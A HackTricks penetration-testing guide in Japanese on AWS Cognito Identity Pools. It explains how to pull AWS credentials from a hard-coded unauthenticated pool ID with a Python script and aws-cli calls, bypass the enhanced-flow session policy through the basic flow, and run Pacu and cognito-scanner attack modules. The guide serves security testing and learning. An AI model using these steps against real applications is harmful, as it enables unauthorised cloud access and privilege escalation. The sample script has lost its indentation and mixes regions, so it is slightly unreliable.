# Cognito Identity Pools

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## 基本情報

Identity poolsは、ユーザーが**一時的な認証情報**を取得することを可能にすることで重要な役割を果たします。これらの認証情報は、Amazon S3やDynamoDBなど、様々なAWSサービスにアクセスするために不可欠です。Identity poolsの特筆すべき機能は、匿名のゲストユーザーだけでなく、ユーザー認証のためのさまざまなアイデンティティプロバイダーをサポートしていることです。サポートされているアイデンティティプロバイダーには以下が含まれます:

- Amazon Cognitoユーザープール
- Facebook、Google、Login with Amazon、Sign in with Appleなどのソーシャルサインインオプション
- OpenID Connect (OIDC) に準拠したプロバイダー
- SAML (Security Assertion Markup Language) アイデンティティプロバイダー
- 開発者認証済みアイデンティティ
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Identity Pool セッションを生成するには、まず**Identity ID を生成する必要があります**。この Identity ID は、そのユーザーのセッションの**識別子です**。これらの識別子は、最大1MBのキーバリューペアを格納できる最大20のデータセットを持つことができます。

これは、ユーザーの情報を保持するのに**役立ちます**（常に同じ Identity ID を使用します）。

さらに、サービス **cognito-sync** は、この情報（データセット内の情報、ストリームでの情報送信、SNS メッセージなど）を**管理し同期することを可能にする**サービスです。

### ペネトレーションテストのためのツール

* [Pacu](https://github.com/RhinoSecurityLabs/pacu) は、AWS のエクスプロイトフレームワークで、"cognito\_\_enum" と "cognito\_\_attack" モジュールが含まれており、アカウント内のすべての Cognito アセットの列挙を自動化し、弱い設定、アクセス制御に使用されるユーザー属性などをフラグ付けし、また、ユーザー作成（MFA サポートを含む）と、変更可能なカスタム属性、使用可能な Identity Pool 資格情報、id トークン内の引き受け可能なロールに基づく権限昇格を自動化します。

モジュールの機能の説明については、[ブログ投稿](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)のパート2を参照してください。インストール手順については、メインの [Pacu](https://github.com/RhinoSecurityLabs/pacu) ページを参照してください。

#### 使用法

特定の Identity Pool と User Pool クライアントに対してユーザー作成とすべての privesc ベクトルを試みる cognito\_\_attack の使用例：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```
Sample cognito__enumの使用例は、現在のAWSアカウントで見えるすべてのユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどを収集するためのものです:
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) は、Pythonで書かれたCLIツールで、Cognitoに対するさまざまな攻撃を実装しています。これには、望ましくないアカウント作成やアイデンティティプールのエスカレーションが含まれます。

#### インストール
```bash
$ pip install cognito-scanner
```
#### 使用方法
```bash
$ cognito-scanner --help
```
詳細については、https://github.com/padok-team/cognito-scanner をご覧ください。

## IAMロールへのアクセス

### 認証されていない

攻撃者がCognitoアプリで**AWSクレデンシャル**を取得するために知る必要があるのは、**Identity Pool ID**のみで、この**IDはアプリケーション**内にハードコードされている必要があります。IDは次のようになります：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（ブルートフォース攻撃は不可能です）。

{% hint style="success" %}
デフォルトで作成される**IAM Cognito未認証ロール**は `Cognito_<Identity Pool name>Unauth_Role` と呼ばれます。
{% endhint %}

ハードコードされたIdentity Pools IDを見つけ、それが未認証ユーザーを許可している場合、以下の方法でAWSクレデンシャルを取得できます：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
以下の**aws cliコマンド**を使用することもできます：
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
デフォルトでは、認証されていないCognito **ユーザーは、ポリシーを介して割り当てられた場合でも、いかなる権限も持つことはできません**。次のセクションを確認してください。
{% endhint %}

### 強化認証フローと基本認証フロー

前のセクションでは、**デフォルトの強化認証フロー**に従いました。このフローは、生成されたIAMロールセッションに[**制限的なセッションポリシー**](../../aws-basic-information/#session-policies)を設定します。このポリシーは、ロールが他のサービスにアクセスできたとしても、[**このリストからのサービスのみを使用することを許可します**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)。

しかし、これを回避する方法があります。**Identityプールに「基本（クラシック）フロー」が有効になっている場合**、ユーザーはそのフローを使用してセッションを取得でき、**その制限的なセッションポリシーは適用されません**。

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
この**エラー**が発生した場合、**基本フローが有効になっていない（デフォルト）**ことを意味します。

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAMクレデンシャルを持っている場合、[どのアクセス権があるかを確認](../../#whoami)し、[権限昇格](../../aws-privilege-escalation/)を試みてください。

### 認証済み

{% hint style="info" %}
**認証済みユーザー**にはおそらく**異なる権限**が付与されるため、アプリ内で**サインアップできる場合**は、それを試みて新しいクレデンシャルを取得してください。
{% endhint %}

**認証済みユーザーがIdentity Poolにアクセスするためのロール**も存在する可能性があります。

これには、**identity provider**へのアクセスが必要になるかもしれません。それが**Cognito User Pool**である場合、デフォルトの振る舞いを悪用して**自分で新しいユーザーを作成**することができるかもしれません。

{% hint style="success" %}
**IAM Cognito認証済みロールはデフォルトで** `Cognito_<Identity Pool name>Auth_Role` **と呼ばれます**
{% endhint %}

とにかく、**次の例**は、Identity Poolにアクセスするために使用される**Cognito User Pool**内で既にログインしていることを前提としています（他のタイプのidentity providerも設定されている可能性を忘れないでください）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Get the identity_id from the previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# In the IdToken you can find roles a user has access because of User Pool Groups
# Use the --custom-role-arn to get credentials to a specific role
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
ユーザーがログインしているidentity providerに応じて、または**ユーザーに依存して**異なるIAMロールを**設定することが可能**です（claimsを使用）。したがって、同じまたは異なるproviderを通じて異なるユーザーにアクセスできる場合、それらのIAMロールにアクセスするために**ログインしてみる価値がある**かもしれません。
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
